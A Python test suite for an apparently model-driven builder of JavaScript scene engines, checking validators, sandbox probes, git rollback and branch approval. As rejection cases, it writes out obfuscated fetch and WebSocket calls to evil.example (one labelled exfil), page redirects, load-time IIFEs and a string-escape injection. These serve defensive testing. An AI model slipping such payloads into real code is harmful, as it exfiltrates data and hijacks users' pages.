import json
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch, Mock

import lab.build_engine as be
import lab.topics as topics_module
from lab.daily import daily, publish
from helpers import GOOD_ENGINE, BROKEN_ENGINE, EngineProvider, on_day

REPO = Path(__file__).resolve().parents[1]
# The files the installer splices into; copied into every test checkout.
FILES = ('web/scene.js', 'web/physics.js', 'web/app.js', 'lab/topics.py')
# The extra site files the real browser gate needs to open ?guide=capture and find CouncilScene.
BROWSER_FILES = ('web/index.html', 'web/style.css', 'web/example.json')


def _browser_ok():
    """Whether a Playwright browser can actually start here; the sandbox tests skip cleanly if not."""
    try:
        from lab.render import launch
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            launch(p).close()
        return True
    except Exception:
        return False


BROWSER = _browser_ok()


def engine_root(tmp, items, full=False):
    """A checkout with the real splice-target files and a curriculum of the given items. With full=True it also copies
    the site files the real browser gate serves."""
    root = Path(tmp)
    (root / 'web').mkdir(exist_ok=True)
    (root / 'lab').mkdir(exist_ok=True)
    for rel in FILES + (BROWSER_FILES if full else ()):
        if (REPO / rel).exists():
            shutil.copyfile(REPO / rel, root / rel)
    (root / 'web' / 'curriculum.json').write_text(json.dumps({'chapters': [{'items': items}]}, indent=1) + '\n')
    return root


def git_checkout(tmp, items, full=False):
    """An engine checkout that is a git repo on main with a bare origin, so candidate branches can be cut and pushed.
    Returns (git, origin, root)."""
    root = engine_root(tmp, items, full)
    (root / '.gitignore').write_text('.council-state/\nweb/runs/\n')
    (root / 'web' / 'proposals.json').write_text('{"proposals": []}\n')
    hooks = Path(tmp) / 'hooks'
    hooks.mkdir()

    def git(cwd, *args):
        return subprocess.run(['git', '-c', f'core.hooksPath={hooks}', *args], cwd=cwd, text=True,
                              capture_output=True, check=True).stdout.strip()
    git(root, 'init', '-q', '-b', 'main', '.')
    for key, value in (('user.name', 'Test'), ('user.email', 't@e.com'), ('commit.gpgsign', 'false'),
                       ('core.hooksPath', str(hooks))):
        git(root, 'config', key, value)
    git(root, 'add', '-A')
    git(root, 'commit', '-qm', 'start')
    origin = Path(tmp) / 'origin.git'
    git(root, 'init', '-q', '--bare', '-b', 'main', str(origin))
    git(root, 'remote', 'add', 'origin', str(origin))
    git(root, 'push', '-q', 'origin', 'main')
    return git, origin, root


def reviewed_state(status='fixture_complete'):
    scene = {'title': 'A placeholder guide', 'subtitle': 'A teaser.', 'why': '', 'kind': 'demo-bars',
             'beats': [{'title': 'One', 'body': 'A.'}, {'title': 'Two', 'body': 'B.'}, {'title': 'Three', 'body': 'C.'}],
             'takeaway': 'A takeaway.', 'mass': 0.6, 'distance': 1.25}
    passes = {'pass': True, 'score': 8, 'summary': 'Fine.', 'changes': [], 'blocking_issues': []}
    revision = {'number': 1, 'scene': scene, 'checks': [{'name': 'ok', 'pass': True}], 'accepted': True,
                'physics_review': passes, 'visual_review': passes, 'learner_review': passes, 'blind_review': passes}
    return {'id': '20261108T090000-engine01', 'provider': 'fixture', 'status': status, 'scene': scene,
            'created': '2026-11-08T09:00:00+00:00', 'revisions': [revision], 'checks': revision['checks']}


def pass_render(scene, directory, research=None, provider='fixture', root=None):
    Path(directory).mkdir(parents=True, exist_ok=True)
    return [], [{'name': 'render', 'pass': True}]


def clean_probe(scene, root, kind, wait_ms=1000):
    return {'fired': [], 'error': None, 'pageerrors': [], 'network': []}


def mock_render():
    """Patch both render gates so the build runs offline: the sandbox probe passes and the render checks pass."""
    return patch.multiple('lab.build_engine', gate_probe=clean_probe, capture=pass_render)


class StructuralRuleTests(unittest.TestCase):
    """The function-only and non-vacuous-check rules, independent of any build."""

    def test_top_level_iife_and_bare_calls_are_rejected(self):
        for bad in ('(function(){window.x=1;})();', 'function draw(){}\nsetItUp();',
                    'const x = makeEngine();', 'let y = 1 + compute();', 'drawThing();'):
            ok, _ = be.top_level_declarations_only(bad)
            self.assertFalse(ok, bad)

    def test_const_rhs_iife_sequence_and_call_are_rejected(self):
        # A leading '(' is only an arrow parameter list when a '=>' follows its matching ')'.
        for bad in ('const a = (function(){ fetch(1); })();', 'const b = (()=>{ fetch(1); })();',
                    'const c = (SIDE(), ()=>{});', 'const d = (0, fn)("u");', 'const e = foo("u");',
                    'const f = obj.method();', 'const g = arr[0]();'):
            ok, _ = be.top_level_declarations_only('function drawX(){ return 1; }\n' + bad)
            self.assertFalse(ok, bad)
        # Genuine arrows with parenthesised params stay allowed.
        for good in ('const a = (x, y) => x + y;', 'const b = (x) => x;', 'const c = async (x) => x;'):
            ok, reason = be.top_level_declarations_only('function drawX(){ return 1; }\n' + good)
            self.assertTrue(ok, f'{good}: {reason}')

    def test_physics_computed_keys_and_accessors_are_rejected(self):
        for bad in ("[(function(){ fetch('u'); return 'z'; })()]: 0, foo(x){ return x; }",
                    "get sneaky(){ return fetch('u'); }, foo(x){ return x; }",
                    "set sneaky(v){ fetch('u'); }, foo(x){ return x; }",
                    "bad: () => fetch('u'), foo(x){ return x; }",
                    "bad: makeIt(), foo(x){ return x; }"):
            ok, _ = be.physics_members_only(bad)
            self.assertFalse(ok, bad)
        self.assertTrue(be.physics_members_only(GOOD_ENGINE['physics'])[0])
        self.assertTrue(be.physics_members_only('rate: 3, foo(x){ return x; }')[0])

    def test_function_and_arrow_declarations_are_allowed(self):
        for good in ('function drawX(ctx,w,h,spec,st){ return ctx; }',
                     'const helper = (a, b) => a + b;\nfunction drawY(){ return helper(1,2); }',
                     GOOD_ENGINE['scene']):
            ok, reason = be.top_level_declarations_only(good)
            self.assertTrue(ok, reason)

    def test_vacuous_checks_are_rejected(self):
        for body in ("fooChecks(){ return [{name:'a', pass: true}]; }",
                     "fooChecks(){ return [{name:'a', pass: 1===1}]; }",
                     "fooChecks(){ return [{name:'a', pass: x === x}]; }",
                     "fooChecks(){ return [{name:'a', pass: this.x(0) >= -1e9}]; }",
                     "fooChecks(){ return [{name:'a', pass: typeof this.x(0) === 'number'}]; }",
                     "fooChecks(){ return [{name:'a', pass: (this.x(0), true)}]; }",
                     "fooChecks(){ return [{name:'a', pass: Boolean(this.x(0)) || true}]; }",
                     "fooChecks(){ return [{name:'a', pass: !!this.x(0)}]; }"):
            ok, _ = be._nonvacuous_checks(body)
            self.assertFalse(ok, body)
        self.assertTrue(be._nonvacuous_checks(GOOD_ENGINE['physics'])[0])

    def test_validate_engine_rejects_a_load_time_iife(self):
        engine = {**GOOD_ENGINE, 'kind': 'demo-iife',
                  'scene': "function drawDemoBars(ctx,w,h,spec,st){ return ctx; }\n(function(){ window.boot = 1; })();"}
        with self.assertRaises(ValueError):
            be.validate_engine(dict(engine))


class BuildEngineTests(unittest.TestCase):
    ITEM = {'id': '9.1', 'question': 'Why is this a placeholder question for the engine builder?', 'model': 'demo-bars'}

    def setUp(self):
        # The in-memory topics update after the gates must not leak between tests.
        for kind in ('demo-bars', 'demo-broken', 'demo-fetch', 'demo-ws', 'demo-timer', 'demo-clock', 'demo-iife',
                     'demo-sload', 'demo-pload'):
            self.addCleanup(lambda k=kind: topics_module.TOPICS.pop(k, None))
            self.addCleanup(lambda k=kind: topics_module.READY.discard(k))

    def never_explored(self):
        return lambda q, model=None: False

    def item(self, model):
        return {**self.ITEM, 'model': model}

    def test_a_successful_build_pushes_a_candidate_branch_and_leaves_main_clean(self):
        with tempfile.TemporaryDirectory() as tmp:
            git, origin, root = git_checkout(tmp, [self.ITEM])
            before = be.snapshot(root, be.SNAPSHOT_FILES)
            head = git(root, 'rev-parse', 'main')
            with mock_render(), patch('lab.build_engine.run', return_value=reviewed_state('fixture_complete')):
                built = be.build_engine(lambda: EngineProvider(), [self.ITEM], root, '2026-11-08',
                                        self.never_explored(), set(), requests=[], rounds=2, push=True)
            self.assertEqual((built['built'], built['model'], built['review_status']), (True, 'demo-bars', 'reviewed'))
            branch = built['branch']
            self.assertEqual(branch, 'engine-candidate/2026-11-08-demo-bars')
            # The candidate branch, on origin, carries the engine code and the draft.
            shipped = git(origin, 'ls-tree', '-r', '--name-only', branch).splitlines()
            for rel in ('web/scene.js', 'web/physics.js', 'lab/topics.py', 'web/app.js', 'web/curriculum.json',
                        f'web/drafts/{built["draft"]}.json', 'web/drafts/index.json'):
                self.assertIn(rel, shipped)
            self.assertIn('function drawDemoBars', git(origin, 'show', f'{branch}:web/scene.js'))
            # main never moved and never received engine code.
            self.assertEqual(git(root, 'rev-parse', 'main'), head)
            self.assertEqual(git(origin, 'rev-parse', 'main'), head)
            self.assertNotIn('function drawDemoBars', git(root, 'show', 'main:web/scene.js'))
            # The main working tree is byte-identical for the engine code and the drafts index; no draft file remains;
            # nothing is staged. Only the owner-facing proposals file is left modified (daily publishes it to main).
            self.assertEqual(be.snapshot(root, be.SNAPSHOT_FILES), before)
            self.assertFalse((root / 'web' / 'drafts' / f'{built["draft"]}.json').exists())
            self.assertEqual(git(root, 'diff', '--cached', '--name-only'), '')
            self.assertEqual(git(root, 'status', '--porcelain', '--untracked-files=no'), 'M web/proposals.json')
            # The proposal makes it visible: a new picture is ready to review on the branch.
            proposals = json.loads((root / 'web' / 'proposals.json').read_text())['proposals']
            engine_proposals = [p for p in proposals if p.get('kind') == 'engine']
            self.assertEqual(len(engine_proposals), 1)
            self.assertEqual(engine_proposals[0]['branch'], branch)
            self.assertEqual(engine_proposals[0]['draft'], built['draft'])
            self.assertFalse((root / 'web' / 'published').exists())

    def test_a_post_gate_exception_rolls_back_fully_and_leaves_main_clean(self):
        with tempfile.TemporaryDirectory() as tmp:
            git, origin, root = git_checkout(tmp, [self.ITEM])
            before = be.snapshot(root, be.SNAPSHOT_FILES)
            head = git(root, 'rev-parse', 'main')
            with mock_render(), patch('lab.build_engine.run', return_value=reviewed_state('fixture_complete')), \
                 patch('lab.build_engine.save_draft', side_effect=RuntimeError('disk full')):
                built = be.build_engine(lambda: EngineProvider(), [self.ITEM], root, '2026-11-08',
                                        self.never_explored(), set(), requests=[], rounds=2, push=True)
            self.assertIsNone(built)
            # Every touched file is byte-identical, no draft, no proposal change, no branch, nothing staged, main fixed.
            self.assertEqual(be.snapshot(root, be.SNAPSHOT_FILES), before)
            self.assertFalse((root / 'web' / 'drafts').exists())
            self.assertEqual(git(root, 'rev-parse', 'main'), head)
            self.assertEqual(git(root, 'diff', '--cached', '--name-only'), '')
            self.assertNotIn('engine-candidate', git(root, 'branch', '--list', 'engine-candidate/*'))
            self.assertEqual(git(origin, 'branch', '--list', 'engine-candidate/*'), '')
            self.assertNotIn('demo-bars', topics_module.READY)
            self.assertNotIn('demo-bars', topics_module.TOPICS)

    def test_a_failed_node_gate_rolls_back_every_file_and_starts_nothing(self):
        with tempfile.TemporaryDirectory() as tmp:
            # BROKEN_ENGINE installs then fails node --check, before any git work.
            root = engine_root(tmp, [self.item('demo-broken')])
            before = be.snapshot(root, be.SNAPSHOT_FILES)
            runner = Mock()
            with mock_render(), patch('lab.build_engine.run', runner):
                built = be.build_engine(lambda: EngineProvider(BROKEN_ENGINE), [self.item('demo-broken')],
                                        root, '2026-11-08', self.never_explored(), set(), requests=[], rounds=2,
                                        push=True)
            self.assertIsNone(built)
            self.assertEqual(be.snapshot(root, be.SNAPSHOT_FILES), before)
            self.assertFalse((root / 'web' / 'drafts').exists())
            runner.assert_not_called()
            self.assertNotIn('demo-broken', topics_module.READY)

    def test_a_load_time_iife_engine_is_rejected_before_any_edit(self):
        iife = {**GOOD_ENGINE, 'kind': 'demo-iife',
                'scene': "function drawDemoBars(ctx,w,h,spec,st){ return ctx; }\n(()=>{ window.x = 1; })();"}
        with tempfile.TemporaryDirectory() as tmp:
            root = engine_root(tmp, [self.item('demo-iife')])
            before = be.snapshot(root, be.SNAPSHOT_FILES)
            with mock_render(), patch('lab.build_engine.run') as runner:
                built = be.build_engine(lambda: EngineProvider(iife), [self.item('demo-iife')], root, '2026-11-08',
                                        self.never_explored(), set(), requests=[], rounds=2, push=False)
            self.assertIsNone(built)
            self.assertEqual(be.snapshot(root, be.SNAPSHOT_FILES), before)
            runner.assert_not_called()

    def test_one_build_attempt_per_day_cap_and_lock_retained(self):
        self.assertTrue(be.guard_day(Path('/nonexistent'), '2026-11-08'))
        with tempfile.TemporaryDirectory() as tmp:
            git, origin, root = git_checkout(tmp, [self.ITEM])
            with mock_render(), patch('lab.build_engine.run', return_value=reviewed_state('fixture_complete')):
                first = be.build_engine(lambda: EngineProvider(), [self.ITEM], root, '2026-11-08',
                                        self.never_explored(), set(), rounds=2, push=False)
                self.assertTrue(first)
                # A second attempt the same day is refused before any model call.
                provider = EngineProvider()
                second = be.build_engine(lambda: provider, [self.ITEM], root, '2026-11-08',
                                         self.never_explored(), set(), rounds=2, push=False)
                self.assertIsNone(second)
                self.assertEqual(provider.calls, 0)
                # A new calendar day may build again.
                self.assertTrue(be.guard_day(root, '2026-11-09'))

    @patch('lab.daily.READY', {'gravity-clocks'})
    def test_daily_idle_cycle_builds_one_candidate_and_keeps_the_cap(self):
        with tempfile.TemporaryDirectory() as tmp:
            git, origin, root = git_checkout(tmp, [self.ITEM])
            with mock_render(), patch('lab.build_engine.run', return_value=reviewed_state('fixture_complete')), \
                 patch('lab.daily.datetime', on_day('2026-11-08')):
                ledger = daily(lambda: EngineProvider(), root=root, requests=[], blueprints=True)
                # The idle branch uses no investigation slot, and a candidate branch was cut (not pushed; push=False).
                self.assertEqual(ledger, [])
                self.assertIn('engine-candidate/2026-11-08-demo-bars',
                              git(root, 'branch', '--list', 'engine-candidate/*'))
                self.assertIn('function drawDemoBars',
                              git(root, 'show', 'engine-candidate/2026-11-08-demo-bars:web/scene.js'))
                self.assertNotIn('function drawDemoBars', git(root, 'show', 'main:web/scene.js'))
                self.assertFalse((root / 'web' / 'published').exists())
                # No draft is left on the main working tree.
                index = root / 'web' / 'drafts' / 'index.json'
                self.assertTrue(not index.exists() or json.loads(index.read_text()) == [])
                proposals = json.loads((root / 'web' / 'proposals.json').read_text())['proposals']
                self.assertEqual(len([p for p in proposals if p.get('kind') == 'engine']), 1)
                # A second cycle the same day builds nothing more (per-day guard).
                daily(lambda: EngineProvider(), root=root, requests=[], blueprints=True)
                branches = git(root, 'branch', '--list', 'engine-candidate/*').split('\n')
                self.assertEqual(len([b for b in branches if b.strip()]), 1)

    def test_reviews_failed_path_saves_a_flagged_draft_on_the_candidate_branch(self):
        with tempfile.TemporaryDirectory() as tmp:
            git, origin, root = git_checkout(tmp, [self.ITEM])
            with mock_render(), patch('lab.build_engine.run', return_value=reviewed_state('needs_review')):
                built = be.build_engine(lambda: EngineProvider(), [self.ITEM], root, '2026-11-08',
                                        self.never_explored(), set(), rounds=2, push=False)
            self.assertEqual(built['review_status'], 'needs_changes')
            branch = built['branch']
            draft = json.loads(git(root, 'show', f'{branch}:web/drafts/{built["draft"]}.json'))
            self.assertEqual(draft['review_status'], 'needs_changes')
            self.assertIn('requested changes', draft['provenance']['intro_note'])
            # The engine code is only on the branch, never on main.
            self.assertNotIn('function drawDemoBars', git(root, 'show', 'main:web/scene.js'))
            self.assertFalse((root / 'web' / 'published').exists())

    def test_approve_engine_fast_forwards_main_after_rerunning_the_gates(self):
        with tempfile.TemporaryDirectory() as tmp:
            git, origin, root = git_checkout(tmp, [self.ITEM])
            with mock_render(), patch('lab.build_engine.run', return_value=reviewed_state('fixture_complete')):
                built = be.build_engine(lambda: EngineProvider(), [self.ITEM], root, '2026-11-08',
                                        self.never_explored(), set(), rounds=2, push=False)
            branch = built['branch']
            branch_head = git(root, 'rev-parse', branch)
            # The owner-facing proposal edit is published to main by the daily cycle; here, restore the working tree to
            # a clean main (without moving it) so the candidate is still a fast-forward.
            git(root, 'checkout', '--', 'web/proposals.json')
            # Re-running the real node gates on the branch, with the render gates patched, fast-forwards main onto it.
            with mock_render():
                merged = be.approve_engine(root, branch)
            self.assertEqual(merged, branch_head)
            self.assertEqual(git(root, 'rev-parse', 'main'), branch_head)
            self.assertIn('function drawDemoBars', git(root, 'show', 'main:web/scene.js'))

    def test_approve_engine_refuses_a_non_candidate_branch(self):
        with tempfile.TemporaryDirectory() as tmp:
            git, origin, root = git_checkout(tmp, [self.ITEM])
            with self.assertRaises(ValueError):
                be.approve_engine(root, 'main')

    @unittest.skipUnless(BROWSER, 'Playwright browser unavailable')
    def test_network_and_timer_engines_are_refused_and_roll_back(self):
        # The browser-global denylist refuses these before any edit; the sandbox, probed directly below, catches the
        # same code behaviourally, so either layer alone stops it.
        cases = {
            'demo-fetch': "function drawDemoBars(ctx,w,h,spec,st){ window['fet'+'ch']('http://evil.example/x'); }",
            'demo-ws': "function drawDemoBars(ctx,w,h,spec,st){ new WebSocket('ws://evil.example'); }",
            'demo-timer': "function drawDemoBars(ctx,w,h,spec,st){ setInterval(function(){}, 10); }",
            'demo-clock': "function drawDemoBars(ctx,w,h,spec,st){ return Date.now(); }",
        }
        for kind, scene in cases.items():
            with tempfile.TemporaryDirectory() as tmp:
                root = engine_root(tmp, [self.item(kind)], full=True)
                before = be.snapshot(root, be.SNAPSHOT_FILES)
                engine = {**GOOD_ENGINE, 'kind': kind, 'checksName': 'demoBarsChecks', 'scene': scene}
                if BROWSER and kind != 'demo-clock':
                    probe = be.gate_probe(be.provisional_scene('', kind), engine_root_with_engine(root, engine, kind), kind)
                    self.assertTrue(probe['fired'] or probe['network'] or probe['pageerrors'], kind)
                with patch('lab.build_engine.capture', pass_render), \
                     patch('lab.build_engine.run') as runner:
                    built = be.build_engine(lambda: EngineProvider(engine), [self.item(kind)], root, '2026-11-08',
                                            self.never_explored(), set(), requests=[], rounds=2, push=False)
                self.assertIsNone(built, kind)
                self.assertEqual(be.snapshot(root, be.SNAPSHOT_FILES), before, kind)
                self.assertFalse((root / 'web' / 'drafts').exists(), kind)
                runner.assert_not_called()

    @unittest.skipUnless(BROWSER, 'Playwright browser unavailable')
    def test_obfuscated_network_access_is_caught_behaviourally(self):
        kind = 'demo-fetch'
        scene = "function drawDemoBars(ctx,w,h,spec,st){ const f = window['fe'+'tch']; f('http://evil.example'); }"
        engine = {**GOOD_ENGINE, 'kind': kind, 'checksName': 'demoBarsChecks', 'scene': scene}
        with tempfile.TemporaryDirectory() as tmp:
            root = engine_root(tmp, [self.item(kind)], full=True)
            before = be.snapshot(root, be.SNAPSHOT_FILES)
            # Directly: the obfuscated access bypasses the denylist but the sandbox stub throws on fetch.
            probe = be.gate_probe(be.provisional_scene('', kind), engine_root_with_engine(root, engine, kind), kind)
            self.assertTrue(probe['fired'] or probe['network'] or probe['pageerrors'])
            # And the whole build rejects it with a byte-identical rollback.
            with patch('lab.build_engine.capture', pass_render), patch('lab.build_engine.run') as runner:
                built = be.build_engine(lambda: EngineProvider(engine), [self.item(kind)], root, '2026-11-08',
                                        self.never_explored(), set(), requests=[], rounds=2, push=False)
            self.assertIsNone(built)
            self.assertEqual(be.snapshot(root, be.SNAPSHOT_FILES), before)
            runner.assert_not_called()

    @unittest.skipUnless(BROWSER, 'Playwright browser unavailable')
    def test_load_time_network_is_caught_by_the_sandbox(self):
        # Code that runs as scene.js / physics.js load, not in draw: an IIFE in the scene, and a computed-key IIFE in
        # the physics object. Both are structurally rejected before install AND caught behaviourally by the sandbox.
        load_scene = {**GOOD_ENGINE, 'kind': 'demo-sload', 'checksName': 'demoBarsChecks',
                      'scene': GOOD_ENGINE['scene']
                      + "\nconst _x=(function(){ window['fe'+'tch']('http://evil.example/exfil').catch(()=>{}); })();"}
        load_phys = {**GOOD_ENGINE, 'kind': 'demo-pload', 'checksName': 'demoBarsChecks',
                     'physics': ("demoBars(x){ return Math.min(1, Math.max(0, x)); },\n"
                                 "    [(function(){ window['fe'+'tch']('http://evil.example/phys').catch(()=>{}); return 'zed'; })()]:0,\n"
                                 "    demoBarsChecks(){ return [{name:'a',pass:this.demoBars(0)===0},"
                                 "{name:'b',pass:this.demoBars(1)===1},{name:'c',pass:this.demoBars(2)===1}]; }")}
        for engine in (load_scene, load_phys):
            kind = engine['kind']
            with tempfile.TemporaryDirectory() as tmp:
                root = engine_root(tmp, [self.item(kind)], full=True)
                before = be.snapshot(root, be.SNAPSHOT_FILES)
                # Direct sandbox: load-time exfil fires a stub, a page error or a recorded non-local request.
                probe = be.gate_probe(be.provisional_scene('', kind), engine_root_with_engine(root, engine, kind), kind)
                self.assertTrue(probe['fired'] or probe['network'] or probe['pageerrors'], kind)
                # Full build also rejects it (structural rule or sandbox) with a byte-identical rollback.
                with patch('lab.build_engine.capture', pass_render), patch('lab.build_engine.run') as runner:
                    built = be.build_engine(lambda: EngineProvider(engine), [self.item(kind)], root, '2026-11-08',
                                            self.never_explored(), set(), requests=[], rounds=2, push=False)
                self.assertIsNone(built, kind)
                self.assertEqual(be.snapshot(root, be.SNAPSHOT_FILES), before, kind)
                runner.assert_not_called()


class HardeningTests(unittest.TestCase):
    """Reviewed engines go live without a human reading the code, so the validators refuse what a drawing never needs."""

    def engine(self, **fields):
        return {**GOOD_ENGINE, **fields}

    def test_browser_globals_this_and_string_keys_are_refused(self):
        refused = [
            "function drawDemoBars(ctx,w,h,spec,st){ location.href='https://evil.example'; }",
            "function drawDemoBars(ctx,w,h,spec,st){ ctx.canvas.ownerDocument.title='x'; }",
            "function drawDemoBars(ctx,w,h,spec,st){ this.alert; }",
            "function drawDemoBars(ctx,w,h,spec,st){ ctx.canvas['owner'+'Document']; }",
            "function drawDemoBars(ctx,w,h,spec,st){ top.name='x'; }",
            "function drawDemoBars(ctx,w,h,spec,st){ open('https://evil.example'); }",
        ]
        for scene in refused:
            with self.assertRaises(ValueError, msg=scene):
                be.validate_engine(self.engine(scene=scene))
        # Words in labels are not code, and the physics object may call its own methods through `this`.
        be.validate_engine(self.engine(scene=GOOD_ENGINE['scene'].replace("'amount'", "'window of time'")))

    def test_code_in_a_template_expression_is_scanned(self):
        sneaky = GOOD_ENGINE['scene'] + "\nconst caption=`${(()=>{ location.href='https://evil.example'; })()}`;"
        with self.assertRaises(ValueError):
            be.validate_engine(self.engine(scene=sneaky))
        self.assertIn('f(1)', be._strip_js('const s=`a${f(1)}b`;'))

    def test_entry_values_that_run_at_load_are_refused(self):
        for entry in (GOOD_ENGINE['entry'] + ",x:(()=>1)()", GOOD_ENGINE['entry'] + ",x:function(){return 1}()",
                      GOOD_ENGINE['entry'] + ",x:helper(1)"):
            with self.assertRaises(ValueError, msg=entry):
                be.validate_engine(self.engine(entry=entry))
        self.assertEqual(be.entry_values_only(GOOD_ENGINE['entry']), (True, ''))

    def test_label_and_category_are_plain_words_and_spliced_as_literals(self):
        with self.assertRaises(ValueError):
            be.validate_engine(self.engine(category="Space\\';location='//evil';//"))
        be.validate_engine(self.engine(label="Newton's cradle", category='Space and time'))
        with tempfile.TemporaryDirectory() as tmp:
            root = engine_root(tmp, [{'id': '9.1', 'question': 'Why?', 'model': 'demo-bars'}])
            # Notes ending in quotes or backslashes, which once could end the Python string early, still compile.
            be.install(self.engine(model_notes="Ends with a quote '", label="Newton's cradle"), 'demo-bars', '9.1', root)
            compile((root / 'lab' / 'topics.py').read_text(), 'topics.py', 'exec')
            self.assertIn('TOPICS[\'demo-bars\']="New investigations";', (root / 'web' / 'app.js').read_text())
            self.assertEqual(subprocess.run(['node', '--check', 'web/app.js'], cwd=root).returncode, 0)


class ReliabilityTests(unittest.TestCase):
    ITEM = BuildEngineTests.ITEM

    def setUp(self):
        self.addCleanup(lambda: topics_module.TOPICS.pop('demo-bars', None))
        self.addCleanup(lambda: topics_module.READY.discard('demo-bars'))

    def build(self, root, factory, push=False, run_state=None, day='2026-11-08'):
        with mock_render(), patch('lab.build_engine.run', return_value=run_state or reviewed_state('fixture_complete')):
            return be.build_engine(factory, [self.ITEM], root, day, lambda q, model=None: False, set(),
                                   requests=[], rounds=2, push=push)

    def test_a_rejected_engine_goes_back_once_with_the_reason(self):
        class Flaky(EngineProvider):
            prompts = []
            def generate(self, role, prompt, schema=None, images=(), research=False):
                if role == 'engine':
                    Flaky.prompts.append(prompt)
                    if len(Flaky.prompts) == 1:
                        self.calls += 1
                        return {**GOOD_ENGINE, 'scene': "function drawDemoBars(ctx,w,h,spec,st){ document.title='x'; }"}
                return super().generate(role, prompt, schema, images, research)
        with tempfile.TemporaryDirectory() as tmp:
            git, origin, root = git_checkout(tmp, [self.ITEM])
            built = self.build(root, lambda: Flaky())
            self.assertTrue(built and built['built'])
            self.assertEqual(len(Flaky.prompts), 2)
            self.assertIn('Your previous engine was rejected', Flaky.prompts[1])
            self.assertIn('document', Flaky.prompts[1])

    def test_a_saved_brief_skips_research_and_design(self):
        class NoResearch(EngineProvider):
            def generate(self, role, prompt, schema=None, images=(), research=False):
                if role in ('researcher', 'scientist', 'designer', 'source_finder'):
                    raise AssertionError(f'{role} should not run when a brief is saved')
                return super().generate(role, prompt, schema, images, research)
        with tempfile.TemporaryDirectory() as tmp:
            git, origin, root = git_checkout(tmp, [self.ITEM])
            provider = EngineProvider()
            research = provider.generate('scientist', 'Q', be.RESEARCH_SCHEMA)
            design = provider.generate('designer', 'Q', be.DESIGN_SCHEMA)
            (root / 'web' / 'briefs').mkdir()
            (root / 'web' / 'briefs' / '9.1.json').write_text(json.dumps(
                {'id': '9.1', 'model': 'demo-bars', 'research': research, 'design': design, 'retrieved_by': 'agent'}))
            built = self.build(root, lambda: NoResearch())
            self.assertTrue(built and built['built'])
            # A brief for another model is ignored rather than trusted.
            self.assertIsNone(be.saved_brief(root, '9.1', 'other-model'))

    def test_a_model_rests_after_three_failed_builds(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = engine_root(tmp, [self.ITEM])
            for n, day in enumerate(('2026-11-08', '2026-11-09', '2026-11-10'), 1):
                self.assertIsNone(self.build(root, lambda: EngineProvider(BROKEN_ENGINE), day=day))
                self.assertEqual(be.build_failures(root), {'demo-bars': n})
            # The fourth morning moves on: no waiting item is left, so nothing is attempted.
            with patch('lab.build_engine._research_and_design') as research:
                self.assertIsNone(self.build(root, lambda: EngineProvider(), day='2026-11-11'))
                research.assert_not_called()

    def live_state(self):
        state = reviewed_state('reviewed')
        state.update(provider='test-live', question=self.ITEM['question'], topic='demo-bars',
                     research={'sources': [{'url': 'https://example.edu/a', 'title': 'A'}]})
        for revision in state['revisions']:
            revision['frames'] = []
        return state

    def test_a_reviewed_build_is_published_to_main_with_its_engine(self):
        with tempfile.TemporaryDirectory() as tmp:
            git, origin, root = git_checkout(tmp, [self.ITEM])
            with patch('lab.daily.site_live', return_value=True), patch('lab.push.notify') as notify:
                built = self.build(root, lambda: EngineProvider(), push=True, run_state=self.live_state())
            run_id = self.live_state()['id']
            self.assertEqual(built['published'], run_id)
            shipped = git(origin, 'ls-tree', '-r', '--name-only', 'main').splitlines()
            for rel in ('web/scene.js', 'web/published/index.json', f'web/published/{run_id}/record.json'):
                self.assertIn(rel, shipped)
            self.assertIn('function drawDemoBars', git(origin, 'show', 'main:web/scene.js'))
            self.assertEqual(git(root, 'rev-parse', 'main'), git(origin, 'rev-parse', 'main'))
            self.assertEqual(git(root, 'branch', '--list', 'engine-candidate/*'), '')
            self.assertEqual(git(root, 'status', '--porcelain', '--untracked-files=no'), '')
            notify.assert_called_once()

    def test_a_failed_publication_leaves_main_exactly_as_it_was(self):
        with tempfile.TemporaryDirectory() as tmp:
            git, origin, root = git_checkout(tmp, [self.ITEM])
            before, head = be.snapshot(root, be.SNAPSHOT_FILES), git(root, 'rev-parse', 'main')
            git(root, 'remote', 'set-url', 'origin', str(Path(tmp) / 'missing.git'))
            with patch('lab.daily.site_live', return_value=True), patch('lab.push.notify') as notify:
                built = self.build(root, lambda: EngineProvider(), push=True, run_state=self.live_state())
            self.assertIsNone(built)
            self.assertEqual(git(root, 'rev-parse', 'main'), head)
            self.assertEqual(be.snapshot(root, be.SNAPSHOT_FILES), before)
            self.assertFalse((root / 'web' / 'published').exists())
            self.assertEqual(git(root, 'status', '--porcelain', '--untracked-files=no'), '')
            notify.assert_not_called()


def engine_root_with_engine(root, engine, kind):
    """Splice an engine into a fresh copy of the checkout and return it, for a direct gate_probe assertion."""
    import copy as _copy
    tmp = root.parent / f'probe-{kind}'
    if tmp.exists():
        shutil.rmtree(tmp)
    shutil.copytree(root, tmp)
    be.install(_copy.deepcopy(engine), kind, '9.1', tmp)
    return tmp


if __name__ == '__main__':
    unittest.main()
